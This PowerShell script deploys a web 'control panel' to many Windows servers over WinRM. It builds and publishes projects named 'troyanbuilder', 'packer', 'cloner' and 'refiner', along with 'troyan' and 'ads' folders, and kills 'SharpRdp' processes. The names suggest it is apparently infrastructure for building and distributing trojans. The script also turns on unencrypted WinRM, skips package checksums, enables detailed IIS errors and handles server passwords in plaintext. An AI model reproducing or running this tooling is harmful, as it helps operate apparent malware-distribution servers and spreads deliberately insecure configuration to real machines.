param (
    [string]$serverName,  [string]$user="",  [string]$password="", [string]$direct="false"
)


if (Get-Service -Name W3SVC -ErrorAction SilentlyContinue) {
    Stop-Service -Name W3SVC
} else {
    Write-Host "Service W3SVC does not exist."
}

choco install dotnet-9.0-sdk --yes --ignore-checksums --no-progress
choco install dotnet-windowshosting --yes --ignore-checksums --no-progress
choco install dotnet-runtime --yes --ignore-checksums --no-progress

$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location -Path $scriptDir
. ".\lib.ps1"

Add-Type -AssemblyName "System.IO.Compression.FileSystem"
$www="C:\inetpub\wwwroot"   
function AddTrusted {
    param ($hostname)

    try
    {
    # Read the current contents of TrustedHosts
    $currentTrustedHosts = (Get-Item WSMan:\localhost\Client\TrustedHosts).Value

    # Check if the currentTrustedHosts is empty or null
    if ([string]::IsNullOrEmpty($currentTrustedHosts)) {
        $newTrustedHosts = $hostname
    } else {
        # Check if the host is already in the TrustedHosts list
        if ($currentTrustedHosts -notmatch [regex]::Escape($hostname)) {
            $newTrustedHosts = "$currentTrustedHosts,$hostname"
        } else {
            # If the host is already in the list, no changes are needed
            $newTrustedHosts = $currentTrustedHosts
        }
    }

    # Update the TrustedHosts list with the new value if it has changed
    if ($currentTrustedHosts -ne $newTrustedHosts) {
        Set-Item WSMan:\localhost\Client\TrustedHosts -Value $newTrustedHosts -Force
    }

    # Display the updated TrustedHosts list
    Get-Item WSMan:\localhost\Client\TrustedHosts

    Set-Item WSMan:\localhost\Client\AllowUnencrypted -Value $true
}
catch {
    Write-Host "Add trusuted... $_"

}

}

function Output(){
    Set-Location -Path $scriptDir
    Write-Host $scriptDir
    
    if ($scriptDir -like "*hephaestus*")
    {
        Clear-Folder -FolderPath "C:\inetpub\wwwroot\cp"

        Set-Location -Path $scriptDir
        Copy-Item -Path "../rdp/*" -Destination "C:\inetpub\wwwroot\cp" -Force -Recurse

        Set-Location -Path ../refiner
        dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release -r win-x64 --self-contained

        Set-Location -Path $scriptDir
        Set-Location -Path ../troyanbuilder
        dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release -r win-x64 --self-contained

        Set-Location -Path $scriptDir
        Set-Location -Path ../cloner
        dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release -r win-x64 --self-contained

        Set-Location -Path $scriptDir
        Set-Location -Path ../packer
        dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release -r win-x64 --self-contained

        Set-Location -Path $scriptDir
        Set-Location -Path ../CertTool
        dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release -r win-x64 --self-contained
            
        Set-Location -Path $scriptDir
        Set-Location -Path ../cp
        dotnet build
        dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release
        

        $nullSource = Split-Path -Path $PSScriptRoot -Parent
        Copy-Folder -SourcePath (Join-Path -Path $nullSource -ChildPath "sys") -DestinationPath "$www\sys" -Clear $true
        Copy-Folder -SourcePath (Join-Path -Path $nullSource -ChildPath "troyan") -DestinationPath "$www\troyan" -Clear $true
        Copy-Folder -SourcePath (Join-Path -Path $nullSource -ChildPath "ads") -DestinationPath "$www\ads" -Clear $false
        Copy-Folder -SourcePath (Join-Path -Path $nullSource -ChildPath "php") -DestinationPath "$www\php"  -Clear $true
        Copy-Item -Path (Join-Path -Path $nullSource -ChildPath "defaulticon.ico") -Destination "$www\defaulticon.ico" -Force

    }
    
    Set-Location -Path $scriptDir

    Clear-Folder -FolderPath "C:\_publish"
    Compress-FolderToZip -SourceFolder "C:\inetpub\wwwroot" -targetZipFile "C:\_publish\wwwroot.zip"
}


function Kill-TaskByName {
    param (
        [string]$TaskName
    )
    $processes = Get-Process | Where-Object { $_.Name -like "*$TaskName*" }
    if ($processes) {
        foreach ($process in $processes) {
            try {
                Stop-Process -Id $process.Id -Force
                Write-Host "Killed process: $($process.Name) (ID: $($process.Id))"
            } catch {
                Write-Host "Failed to kill process: $($process.Name) (ID: $($process.Id)) - $_"
            }
        }
    } else {
        Write-Host "No processes found matching '$TaskName'."
    }
}

Kill-TaskByName("SharpRdp")
Output;

$dirs = @(Get-ChildItem -Directory -Path "C:\data")

function Install{
    param ($serverIp, $login, $password)

    AddTrusted -hostname $serverIp

    Write-Host "Publish CP REMOTE begin $serverIp"
    if ($password -eq "password" -or $null -eq $password -or $password -eq "")
    {
        $password = [System.Environment]::GetEnvironmentVariable("SuperPassword_$serverIp", [System.EnvironmentVariableTarget]::Machine)
    }
    if (-not $password -and -not (IsLocalServer -serverIp $serverIp )) {
        Write-Host "Password cannot be null. See SuperPassword_$serverIp env var."
        exit 1
    }
    
    try
    {
        if (IsLocalServer -serverIp $serverIp)
        {
            $session = New-PSSession -ComputerName $serverIp
        }
        else 
        {
            $spass = (ConvertTo-SecureString -String $password -AsPlainText -Force)
            $credentialObject = New-Object System.Management.Automation.PSCredential ($login, $spass)
            $session = New-PSSession -ComputerName $serverIp -Credential $credentialObject
        }
        Invoke-Command -Session $session -ScriptBlock {

            if (-not (Test-Path "C:\data"))
            {
                New-Item -Path "C:\data" -ItemType Directory -Force
            }

            if (-not (Test-Path "C:\_publish\"))
            {
                New-Item -Path "C:\_publish" -ItemType Directory -Force
            }
            if (Test-Path "C:\_publish\wwwroot2.zip")
            {
                Remove-Item -Path "C:\_publish\wwwroot2.zip"
                Remove-Item -Path "C:\_publish\extracted" -Force -Recurse
            }
        }
    }
    catch {
        Write-Host "Skipping... $serverIp"
        continue;
    }

    Copy-Item -Path "C:\_publish\wwwroot.zip" -Destination "C:\_publish\wwwroot2.zip" -ToSession $session -Force
    
    Invoke-Command -Session $session -ScriptBlock {
        param ([string]$serverIp, [string]$login, [string]$password)
     
        Stop-Service -Name W3SVC
        Import-Module WebAdministration

        function Extract-ZipFile {
            param (
                [string]$zipFilePath,
                [string]$destinationPath
            )
        
            # Ensure the destination path exists
            if (-not (Test-Path -Path $destinationPath)) {
                Write-Output "Destination path does not exist. Creating: $destinationPath"
                New-Item -ItemType Directory -Path $destinationPath -Force
            }
        
            # Load the required assembly for ZIP operations
            try {
                [System.Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem") | Out-Null
                Write-Output "Assembly System.IO.Compression.FileSystem loaded successfully."
            } catch {
                Write-Error "Failed to load the required assembly."
                return
            }
        
            # Perform the extraction
            try {
                $zipArchive = [System.IO.Compression.ZipFile]::OpenRead($zipFilePath)
                
                foreach ($entry in $zipArchive.Entries) {
                    try 
                    {
                
                        $entryDestinationPath = Join-Path -Path $destinationPath -ChildPath $entry.FullName
            
                        if ($entry.FullName.EndsWith('/')) {
                            # Create directory if it doesn't exist
                            if (-not (Test-Path -Path $entryDestinationPath)) {
                                Write-Output "Creating directory: $entryDestinationPath"
                                New-Item -ItemType Directory -Path $entryDestinationPath -Force -ErrorAction SilentlyContinue 
                            }
                        } else {
                            # Ensure directory exists
                            $entryDir = [System.IO.Path]::GetDirectoryName($entryDestinationPath)
                            if (-not (Test-Path -Path $entryDir)) {
                                Write-Output "Creating directory: $entryDir"
                                New-Item -ItemType Directory -Path $entryDir -Force -ErrorAction SilentlyContinue 
                            }
            
                            
                            try {
                        
                                # Extract file, overwrite if exists
                                $entryStream = $entry.Open()
                                $fileStream = [System.IO.File]::Create($entryDestinationPath)
                
                                try {
                                    $entryStream.CopyTo($fileStream)
                                    $fileStream.Close()  # Close the file stream explicitly
                                } catch {
                                    Write-Error "Failed to extract file: $entryDestinationPath. $_"
                                } finally {
                                    $entryStream.Close()  # Close the entry stream explicitly
                                }
                            } catch {
    
                            }
                        }
                     } 
                     catch 
                     {
                        Write-Error "An error occurred during extraction: $_"
                     }                
                }                    
                Write-Output "Extraction completed successfully. Files extracted to $destinationPath"
            } 
            catch {
                Write-Error "An error occurred during extraction: $_"
            } finally {
                if ($zipArchive) {
                    $zipArchive.Dispose()
                }
            }
        }

        function Clear-Folder {
            param(
                [Parameter(Mandatory=$true)]
                [string]$FolderPath
            )
        
            # Create the folder if it doesn't exist
            if (-not (Test-Path -Path $FolderPath -PathType Container)) {
                New-Item -Path $FolderPath -ItemType Directory -Force | Out-Null
                Write-Output "Created folder '$FolderPath'."
            }
        
            try {
                # Get all items (files and folders) in the folder
                $items = Get-ChildItem -Path $FolderPath -Force
        
                # Remove each item
                foreach ($item in $items) {
                    if ($item.PSIsContainer) {
                        Remove-Item -Path $item.FullName -Recurse -Force
                    } else {
                        Remove-Item -Path $item.FullName -Force
                    }
                }
        
                Write-Output "Folder '$FolderPath' cleaned successfully."
            } catch {
                Write-Error "Failed to clean folder '$FolderPath'. $_"
            }
        }

        function Copy-Folder {
            param (
                [string]$SourcePath,
                [string]$DestinationPath,
                [bool]$Clear
            )
            
            # Check if the destination directory exists
            if (Test-Path -Path $DestinationPath) {
                if ($Clear) {
                    # Clear the contents of the destination directory
                    Get-ChildItem -Path $DestinationPath -Recurse | Remove-Item -Recurse -Force
                    Write-Output "Cleared directory: $DestinationPath"
                } else {
                    Write-Output "Directory already exists: $DestinationPath"
                }
            } else {
                # Create the destination directory if it does not exist
                New-Item -Path $DestinationPath -ItemType Directory | Out-Null
                Write-Output "Created directory: $DestinationPath"
            }

            if (-not (Test-Path -Path $DestinationPath)) {
                New-Item -Path $DestinationPath -ItemType Directory | Out-Null
            }
        
            $sourceItems = Get-ChildItem -Path $SourcePath -Recurse

            foreach ($item in $sourceItems) {
                # Compute the destination path for each item
                $destinationItemPath = Join-Path -Path $DestinationPath -ChildPath ($item.FullName.Substring($SourcePath.Length))
        
                if ($item.PSIsContainer) {
                    # Create directories if they don't exist
                    if (-not (Test-Path -Path $destinationItemPath)) {
                        New-Item -Path $destinationItemPath -ItemType Directory | Out-Null
                    }
                } else {
                    # Copy files
                    Copy-Item -Path $item.FullName -Destination $destinationItemPath -Force
                }
            }
            
            # Output status message
            Write-Output "Folder copied from '$SourcePath' to '$DestinationPath'."
        }

        function Kill-TaskByName {
            param (
                [string]$TaskName
            )
            $processes = Get-Process | Where-Object { $_.Name -like "*$TaskName*" }
            if ($processes) {
                foreach ($process in $processes) {
                    try {
                        Stop-Process -Id $process.Id -Force
                        Write-Host "Killed process: $($process.Name) (ID: $($process.Id))"
                    } catch {
                        Write-Host "Failed to kill process: $($process.Name) (ID: $($process.Id)) - $_"
                    }
                }
            } else {
                Write-Host "No processes found matching '$TaskName'."
            }
        }
        $www="C:\inetpub\wwwroot"    
        $siteName = "Default Web Site"
        $username = "$env:COMPUTERNAME\$login"
        $ipAddress = $serverIp
        $appPoolName = "DefaultAppPool"
        $siteDir = "$www\cp"
        #remove site
        $iisSite = Get-Website -Name $siteName -ErrorAction SilentlyContinue
        if ($null -ne $iisSite)
        {
            Stop-Website -Name $siteName -ErrorAction SilentlyContinue
            Remove-WebSite -Name $siteName -ErrorAction SilentlyContinue
        }
        if (-Not (Test-Path -Path $siteDir)) {
            New-Item -Path $siteDir -ItemType Directory | Out-Null
        }
        Get-ChildItem -Path $siteDir | Remove-Item -Recurse -Force

        #remove pool
        if (Test-Path "IIS:\AppPools\$appPoolName") {
            Stop-WebAppPool -Name $appPoolName -ErrorAction SilentlyContinue
            Remove-Item "IIS:\AppPools\$appPoolName" -Recurse
            Write-Output "Existing identity for '$appPoolName' removed."
        }
        New-Item "IIS:\AppPools\$appPoolName"
        Set-ItemProperty "IIS:\AppPools\$appPoolName" -Name "processModel.identityType" -Value "SpecificUser"
        Set-ItemProperty "IIS:\AppPools\$appPoolName" -Name "processModel.userName" -Value $username
        Set-ItemProperty "IIS:\AppPools\$appPoolName" -Name "processModel.password" -Value $password
        Set-ItemProperty "IIS:\AppPools\$appPoolName" -Name "managedRuntimeVersion" -Value ""
        Set-ItemProperty "IIS:\AppPools\$appPoolName" -Name "managedPipelineMode" -Value "Integrated"
        Set-WebConfigurationProperty -Filter '/system.webServer/httpErrors' -Name errorMode -Value Detailed
        Start-WebAppPool -Name $appPoolName
        
        Clear-Folder -FolderPath "C:\_publish\extracted"
        Extract-ZipFile -zipFilePath "C:\_publish\wwwroot2.zip" -destinationPath "C:\_publish\extracted"

        Kill-TaskByName -TaskName "Refiner"
        
        Copy-Folder -SourcePath "C:\_publish\extracted\wwwroot\cp" -DestinationPath $siteDir -Clear $true
        Copy-Folder -SourcePath "C:\_publish\extracted\wwwroot\sys" -DestinationPath "$www\sys" -Clear $true
        Copy-Folder -SourcePath "C:\_publish\extracted\wwwroot\troyan" -DestinationPath "$www\troyan" -Clear $true
        Copy-Folder -SourcePath "C:\_publish\extracted\wwwroot\ads" -DestinationPath "$www\ads" -Clear $false
        Copy-Folder -SourcePath "C:\_publish\extracted\wwwroot\php" -DestinationPath "$www\php" -Clear $true
        Copy-Item -Path "C:\_publish\extracted\wwwroot\defaulticon.ico" -Destination "$www\defaulticon.ico" -Force
    

        Start-Service -Name W3SVC

        Start-WebAppPool -Name $appPoolName -ErrorAction SilentlyContinue

        New-Website -Name $siteName -PhysicalPath $siteDir -Port 80 -IPAddress $ipAddress -ApplicationPool $appPoolName
        Start-Website -Name $siteName -ErrorAction SilentlyContinue

        Write-Host "Starting refiner..."
        Start-Process -FilePath "C:\inetpub\wwwroot\cp\Refiner.exe" -ArgumentList "default", "apply", $serverIp -Wait

        Write-Host "Publish CP REMOTE complete $ipAddress"

    }  -ArgumentList $serverIp, $login, $password

    Write-Host "Publish $serverName is complete"
}

if ($direct -ne "true")
{
    Write-Host "Non-Direct"
    foreach ($dir in $dirs)
    {
        $serverName = $dir.Name
        if ($serverName -eq "debug")
        {
            continue;
        }
        $serverPath = Resolve-Path -Path (Join-Path -Path "C:\data\$serverName" -ChildPath "server.json")
        $server = Get-Content -Path $serverPath -Raw | ConvertFrom-Json
        
        Install -serverIp $server.serverIp -login $server.login -password $server.password
    }
} else 
{
    Write-Host "Direct"
    Install -serverIp $serverName -login $user -password $password 
}

if (Get-Service -Name W3SVC -ErrorAction SilentlyContinue) {
    Start-Service -Name W3SVC
} else {
    Write-Host "Service W3SVC does not exist."
}


Write-Host "Publish all is end"